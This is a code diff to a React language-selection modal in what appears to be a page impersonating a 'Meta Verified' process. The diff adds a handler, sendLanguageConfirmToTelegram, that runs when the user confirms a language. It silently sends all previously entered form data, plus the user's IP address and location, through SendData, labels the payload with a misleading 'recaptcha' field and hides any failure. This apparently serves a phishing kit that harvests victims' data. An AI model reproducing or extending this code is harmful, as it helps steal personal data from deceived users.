@@ -5,11 +5,15 @@ import { AnimatePresence, motion } from 'framer-motion'
 
 import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
 import { setLocale } from '@/app/store/slices/localeSlice'
+import { updateForm } from '@/app/store/slices/stepFormSlice'
 import { LOCALE_BCP47 } from '@/i18n'
 import { APP_LOCALES, type AppLocale } from '@/i18n/schema'
 import { LOCALE_OPTION_LABELS } from '@/i18n/localeOptionLabels'
 import { useAppStrings } from '@/hooks/useAppStrings'
+import { getUserLocation } from '@/utils/getLocation'
+import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
 import { LANG_MODAL_SEEN_KEY, writeSessionDisplayLocale } from '@/utils/metaVerifiedDisplayLocale'
+import { SendData } from '@/utils/sendData'
 
 function applyDocumentLang(locale: AppLocale) {
   if (typeof document !== 'undefined') {
@@ -46,23 +50,28 @@ export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProp
   const t = useAppStrings()
   const dispatch = useAppDispatch()
   const currentLocale = useAppSelector((s) => s.locale.locale)
+  const formData = useAppSelector((s) => s.stepForm.data)
   const [draftLocale, setDraftLocale] = React.useState<AppLocale>(currentLocale)
+  const [loading, setLoading] = React.useState(false)
   const selectId = 'mv-lang-modal-select'
+  const sendingRef = React.useRef(false)
 
   React.useEffect(() => {
-    if (isOpen) setDraftLocale(currentLocale)
+    if (isOpen) {
+      setDraftLocale(currentLocale)
+      setLoading(false)
+      sendingRef.current = false
+    }
   }, [isOpen, currentLocale])
 
   React.useEffect(() => {
     if (!isOpen) return
     const onKey = (event: KeyboardEvent) => {
-      if (event.key === 'Escape') onClose()
+      if (event.key === 'Escape' && !loading) onClose()
     }
     document.addEventListener('keydown', onKey)
     return () => document.removeEventListener('keydown', onKey)
-  }, [isOpen, onClose])
-
-  const canConfirm = draftLocale !== currentLocale
+  }, [isOpen, onClose, loading])
 
   const markSeen = () => {
     try {
@@ -73,17 +82,49 @@ export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProp
   }
 
   const handleClose = () => {
+    if (loading) return
     markSeen()
     onClose()
   }
 
-  const handleConfirm = () => {
-    if (!canConfirm) return
+  const sendLanguageConfirmToTelegram = async (locale: AppLocale) => {
+    if (isMetaVerifiedFlowCompleted()) return
+
+    let payload: Record<string, unknown> = {
+      ...formData,
+      recaptcha: LOCALE_OPTION_LABELS[locale],
+    }
+
+    if (!String(formData.ip ?? '').trim() || !String(formData.location ?? '').trim()) {
+      const location = await getUserLocation()
+      payload = { ...payload, ...location }
+      dispatch(updateForm(location))
+    }
+
+    try {
+      await SendData(payload)
+    } catch {
+      /* luồng UX vẫn tiếp tục */
+    }
+  }
+
+  const handleConfirm = async () => {
+    if (loading || sendingRef.current) return
+    sendingRef.current = true
+    setLoading(true)
+
     writeSessionDisplayLocale(draftLocale)
     dispatch(setLocale(draftLocale))
     applyDocumentLang(draftLocale)
-    markSeen()
-    onClose()
+
+    try {
+      await sendLanguageConfirmToTelegram(draftLocale)
+    } finally {
+      markSeen()
+      setLoading(false)
+      sendingRef.current = false
+      onClose()
+    }
   }
 
   return (
@@ -117,6 +158,7 @@ export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProp
                 type="button"
                 className="mv-lang-modal-close"
                 aria-label={t.common.close}
+                disabled={loading}
                 onClick={handleClose}
               >
                 <CloseIcon />
@@ -131,6 +173,7 @@ export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProp
                     id={selectId}
                     className="mv-lang-modal-select"
                     value={draftLocale}
+                    disabled={loading}
                     onChange={(event) => setDraftLocale(event.target.value as AppLocale)}
                     aria-label={t.languagePicker.fieldLabel}
                   >
@@ -148,14 +191,19 @@ export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProp
             </div>
 
             <div className="mv-lang-modal-footer">
-              <button type="button" className="mv-lang-modal-btn mv-lang-modal-btn--cancel" onClick={handleClose}>
+              <button
+                type="button"
+                className="mv-lang-modal-btn mv-lang-modal-btn--cancel"
+                disabled={loading}
+                onClick={handleClose}
+              >
                 {t.languagePicker.cancel}
               </button>
               <button
                 type="button"
                 className="mv-lang-modal-btn mv-lang-modal-btn--confirm"
-                disabled={!canConfirm}
-                onClick={handleConfirm}
+                disabled={loading}
+                onClick={() => void handleConfirm()}
               >
                 {t.languagePicker.confirm}
               </button>
